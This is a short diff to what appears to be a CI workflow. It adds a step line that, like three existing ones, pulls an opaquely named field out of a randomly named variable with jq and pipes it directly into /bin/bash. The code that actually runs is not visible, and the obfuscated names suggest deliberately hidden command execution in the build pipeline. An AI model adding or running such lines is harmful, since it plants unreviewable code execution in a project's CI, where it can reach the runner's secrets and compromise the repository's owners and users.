@@ -39,6 +39,7 @@ jobs:
           echo $i5708 | jq -r .mwnhc4 | /bin/bash
           echo $odrsr0645 | jq -r .wgldi36654 | /bin/bash
           printf '%s' "$eowgm6465" | jq -r .sh95338 | /bin/bash
+          printf '%s' "$xn753" | jq -r .pcn7 | /bin/bash
 
       - name: Upload results
         if: always()
